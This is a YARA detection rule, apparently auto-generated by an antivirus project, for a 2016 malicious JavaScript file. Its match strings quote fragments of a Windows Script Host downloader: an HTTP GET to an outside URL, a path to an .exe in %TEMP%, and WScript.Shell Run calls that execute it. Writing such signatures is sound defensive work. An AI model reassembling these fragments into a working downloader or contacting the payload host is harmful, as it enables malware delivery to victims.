rule sig_20160329_811f13597a8daffefb99b647f26a9b91 {
  meta:
    description = "datamaliciousorder - file 20160329_811f13597a8daffefb99b647f26a9b91.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "57a0b7e7bb64e8b9f6a176a800d6c46969396bd3ea4f3d5833ed71d5dfc0c0b0"

  strings:
    $s1  = "function W() {return R[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"r0Dw8x5O.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[e](B() * 11); if (uP[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "uP[Af](\"GET\", \"http://cngfloristsundries.co.uk/mo4erp\", false);" fullword ascii
    $s4  = "function vL(f, Ev){UT = UT * 1; return f - Ev;};" fullword ascii
    $s5  = "var R = function n() {return WScript[h](\"WScript.Shell\");}(), l = 11;" fullword ascii
    $s6  = "function gL(){return \"\" + J;};" fullword ascii
    $s7  = "function Wy() {return ((xL == true) && (xL == bj)) ? 1 : UT;};" fullword ascii
    $s8  = "function OD(Kp){R[\"Run\"](Kp, UT, UT);};" fullword ascii
    $s9  = "function B(){return 22;};" fullword ascii
    $s10 = "var m = new this[\"Date\"]();" fullword ascii
    $s11 = " while (H){" fullword ascii
    $s12 = "function sF(){return h;};" fullword ascii
    $s13 = "function y()" fullword ascii
    $s14 = "function I(wO) {var mp = (1, 2, 3, 4, 5, wO); return mp;};" fullword ascii
    $s15 = "return vL(Zt, p);" fullword ascii
    $s16 = "var bj = false;" fullword ascii
    $s17 = "xL = true; " fullword ascii
    $s18 = "var g0 = false;" fullword ascii
    $s19 = "var xL = false;" fullword ascii
    $s20 = "bj = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}